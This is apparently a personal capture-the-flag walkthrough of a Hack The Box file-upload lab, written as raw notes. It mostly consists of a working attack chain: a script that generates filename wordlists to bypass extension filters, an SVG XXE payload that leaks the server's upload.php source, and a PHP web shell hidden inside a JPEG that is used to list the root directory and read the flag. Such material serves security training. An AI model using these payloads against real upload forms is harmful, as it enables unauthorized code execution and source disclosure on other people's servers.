# Skills Assessment - File Uploads

http://94.237.63.93:30148/

http://94.237.63.93:30148/index.php

http://94.237.63.93:30148/contact/

GET /contact/submit.php?Name=test&Email=test%40test.com&Message=test&uploadFile=test.jpg HTTP/1.1
Host: 94.237.63.93:30148

               <input name="uploadFile" id="uploadFile" type="file" class="custom-file-input" id="inputGroupFile02" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">


http://94.237.63.93:30148/contact/script.js

function checkFile(File) {
  var file = File.files[0];
  var filename = file.name;
  var extension = filename.split('.').pop();

  if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    $('#upload_message').text("Only images are allowed");
    File.form.reset();
  } else {
    $("#inputGroupFile01").text(filename);
  }
}

onchange="checkFile(this)" accept=".jpg,.jpeg,.png"
onchange="" accept=""

--> Length when it is OK is 2044

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.phar'; do
        echo "shell$ext.jpg" >> wordlist.txt
        echo "shell.jpg$ext" >> wordlist.txt
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done

--> every response is 2044

https://file-examples.com/index.php/sample-images-download/sample-jpg-download/


POST /contact/upload.php HTTP/1.1
------WebKitFormBoundaryDTjASnQBDxdbriL1
Content-Disposition: form-data; name="uploadFile"; filename="file.jpg"
Content-Type: image/jpeg

HTTP/1.1 200 OK
Content-Length: 136247

> Burp Intruder

Payload options

Content-Disposition: form-data; name="uploadFile"; filename="§file.jpg§"
Content-Type: image/jpeg

wordlist.txt

disable Endoding

shell.phar.jpg is accepted because length is 135989


vi shell.svg

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>

<svg>PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K</svg>

echo -n 'PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG1sKS8nLCAkZmlsZU5hbWUpKSB7CiAgICBlY2hvICJFeHRlbnNpb24gbm90IGFsbG93ZWQiOwogICAgZGllKCk7Cn0KCi8vIHdoaXRlbGlzdCB0ZXN0CmlmICghcHJlZ19tYXRjaCgnL14uK1wuW2Etel17MiwzfWckLycsICRmaWxlTmFtZSkpIHsKICAgIGVjaG8gIk9ubHkgaW1hZ2VzIGFyZSBhbGxvd2VkIjsKICAgIGRpZSgpOwp9CgovLyB0eXBlIHRlc3QKZm9yZWFjaCAoYXJyYXkoJGNvbnRlbnRUeXBlLCAkTUlNRXR5cGUpIGFzICR0eXBlKSB7CiAgICBpZiAoIXByZWdfbWF0Y2goJy9pbWFnZVwvW2Etel17MiwzfWcvJywgJHR5cGUpKSB7CiAgICAgICAgZWNobyAiT25seSBpbWFnZXMgYXJlIGFsbG93ZWQiOwogICAgICAgIGRpZSgpOwogICAgfQp9CgovLyBzaXplIHRlc3QKaWYgKCRfRklMRVNbInVwbG9hZEZpbGUiXVsic2l6ZSJdID4gNTAwMDAwKSB7CiAgICBlY2hvICJGaWxlIHRvbyBsYXJnZSI7CiAgICBkaWUoKTsKfQoKaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSkpIHsKICAgIGRpc3BsYXlIVE1MSW1hZ2UoJHRhcmdldF9maWxlKTsKfSBlbHNlIHsKICAgIGVjaG8gIkZpbGUgZmFpbGVkIHRvIHVwbG9hZCI7Cn0K' | base64 -d > upload.php

$target_dir = "./user_feedback_submissions/";


cp file.jpg shell.phar.jpeg

vi shell.phar.jpeg

:2,350d

����^@^PJFIF^@^A^A^A^A,^A,^@^@��^@dExif^@^@II*^@^H^@^@^@^B^@^N^A^B^@-^@^@^@&^@^>
<?php system('$_REQUEST['cmd']');?>

Content-Disposition: form-data; name="uploadFile"; filename="shell.phar.jpeg"
Content-Type: image/jpeg

����^@^PJFIF^@^A^A^A^A,^A,^@^@��^@dExif^@^@II*^@^H^@^@^@^B^@^N^A^B^@-^@^@^@&^@^>
<?php system('$_REQUEST['cmd']');?>

<img style="object-fit: contain; " width='400' height='200' src='data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/4gxYSUNDX1BST0ZJTEUAAQEAAAxITGlubwIQAABtbnRyUkdCIFhZWiAHzgACAAkKPD9waHAgc3lzdGVtKCckX1JFUVVFU1RbJ2NtZCddJyk7Pz4KCg=='/>

http://94.237.63.93:30148/contact/user_feedback_submissions/240103_shell.phar.jpeg?cmd=ls

 cat shell3.phar.jpeg 
����JFIFHH��
            XICC_PROFILE
                        HLinomntrRGB XYZ �>
<?php system('$_REQUEST['cmd']');?>

--> failed

cat shell2.phar.jpeg 
����JFIFHH��
            XICC_PROFILE
                        HLinomntrRGB XYZ �>
<?php system('ls -l /');?>


http://94.237.63.93:30148/contact/user_feedback_submissions/240103_shell2.phar.jpeg?cmd=ls

����JFIFHH��XICC_PROFILEHLinomntrRGB XYZ �> total 60 lrwxrwxrwx 1 root root 7 Jul 20 2020 bin -> usr/bin drwxr-xr-x 2 root root 4096 Apr 15 2020 boot drwxr-xr-x 5 root root 360 Jan 3 20:13 dev drwxr-xr-x 1 root root 4096 Sep 14 2021 etc -rw-r--r-- 1 root root 35 Oct 27 2021 flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt drwxr-xr-x 2 root root 4096 Apr 15 2020 home lrwxrwxrwx 1 root root 7 Jul 20 2020 lib -> usr/lib lrwxrwxrwx 1 root root 9 Jul 20 2020 lib32 -> usr/lib32 lrwxrwxrwx 1 root root 9 Jul 20 2020 lib64 -> usr/lib64 lrwxrwxrwx 1 root root 10 Jul 20 2020 libx32 -> usr/libx32 drwxr-xr-x 2 root root 4096 Jul 20 2020 media drwxr-xr-x 2 root root 4096 Jul 20 2020 mnt drwxr-xr-x 2 root root 4096 Jul 20 2020 opt dr-xr-xr-x 503 root root 0 Jan 3 20:13 proc drwx------ 1 root root 4096 Aug 19 2020 root drwxr-xr-x 1 root root 4096 Feb 14 2021 run lrwxrwxrwx 1 root root 8 Jul 20 2020 sbin -> usr/sbin drwxr-xr-x 2 root root 4096 Jul 20 2020 srv dr-xr-xr-x 13 root root 0 Jan 3 20:13 sys drwxrwxrwt 1 root root 4096 Jan 3 21:12 tmp drwxr-xr-x 1 root root 4096 Jul 20 2020 usr drwxr-xr-x 1 root root 4096 Aug 19 2020 var

flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt

����JFIFHH��XICC_PROFILEHLinomntrRGB XYZ �> HTB{m4573r1ng_upl04d_3xpl0174710n}